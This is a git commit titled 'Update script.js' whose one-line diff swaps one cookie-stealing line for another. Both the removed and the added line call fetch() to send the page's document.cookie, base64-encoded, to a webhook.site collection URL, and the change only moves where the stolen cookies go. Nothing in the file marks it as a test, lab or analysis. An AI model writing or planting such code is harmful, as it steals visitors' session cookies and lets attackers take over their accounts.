2437390b1cad2933ff001ee483ad38f8ac9f4378
ZickeyChang <139235464+ZickeyChang@users.noreply.github.com>
2025-08-12 00:21:25 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/39e064e1-97af-440f-ba6f-1085fcf4b808/?q=" + btoa(document.cookie));
+fetch("https://webhook.site/b7280fa9-f259-490f-bf3a-3ecbfcd91089/?q=" + btoa(document.cookie));
